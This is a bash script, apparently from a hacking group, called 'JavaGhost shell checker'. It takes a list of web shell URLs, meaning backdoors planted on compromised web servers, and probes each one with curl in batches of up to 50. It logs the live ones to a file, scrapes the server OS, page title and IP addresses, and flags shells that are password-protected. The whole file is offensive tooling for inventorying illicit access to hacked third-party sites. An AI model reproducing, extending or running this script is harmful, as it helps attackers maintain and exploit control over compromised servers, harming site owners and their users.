# !/bin/bash
# author : ./Lolz

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# User agent
UserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"

# dependencies
dependencies=( "curl")
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : Not installed!"
        exit
    }
done


# start
# banner
echo -e '''
JavaGhost shell checker \e[1;31m+\e[1;37m auto show information shell
'''

# asking
read -p $'[\e[1;31m?\e[1;37m] Input list shell \e[1;31m:\e[1;32m ' ask
if [[ ! -e $ask ]]; then
	echo -e "${red}[ File not found! ]${white}\n"
	exit
fi
echo ""

# function
function get_response(){
	if [[ $(curl --user-agent "${UserAgent}" -sI $url | grep -o "200") =~ "200" ]]; then
		echo -e "${white}[ ${green}LIVE${white} ] ${red}-${white} ${url}"
    	echo $url >> live_shell.txt
	else
		echo -e "${white}[ ${red}DEAD${white} ] ${red}-${white} ${url}"
	fi
}

function get_information(){
	check_os=$(curl --user-agent "${UserAgent}" -s "$url" --compressed | grep -o "Linux\|Ubuntu\|Windows\|CentOS")
	if [[ $check_os == "Linux" ]] || [[ $check_os == "Ubuntu" ]] || [[ $check_os == "Windows" ]] || [[ $check_os == "CentOS" ]]; then
		echo -e "${white}[${red}+${white}] Name   ${red}:${yellow} "$(curl --user-agent "${UserAgent}" -s $url --compressed | grep -o "<title>.*" | cut -d ">" -f2 | cut -d "<" -f1)
    	echo -e "${white}[${red}+${white}] System ${red}:${yellow} "$(curl --user-agent "${UserAgent}" -s $url --compressed | grep -o "Linux.*" | cut -d "<" -f1)
    	echo -e "${white}[${red}+${white}] IPs    ${red}:${yellow} "$(dig +short $(echo $url | sed 's|https://www.||g;s|https://||g;s|http://||g' | cut -d "/" -f1,2,3 | sed "s|http://||g"))
    	echo ""
    elif [[ $(curl --user-agent "${UserAgent}" -s "$url" --compressed | grep -o '<input type="password"\|<input type=password') =~ "password" ]]; then
    	echo -e "${white}[${red}*${white}]${red} Shell with password${white}"
    	echo ""
    else
    	echo -e "${white}[${red}-${white}] Information not showing ${red}[${white} contact ${red}:${blue} https://fb.me/n00b.me ${red}]${white}"
    	echo ""
   	fi
}

# multithread
(
	for url in $(cat $ask); do
		((thread=thread%50)); ((thread++==0)) && wait
		get_response &
		get_information "$url"
	done
	wait
)

echo -e "${white}[${red}+${white}] Total live shell ${red}:${green} "$(< live_shell.txt wc -l)
# end
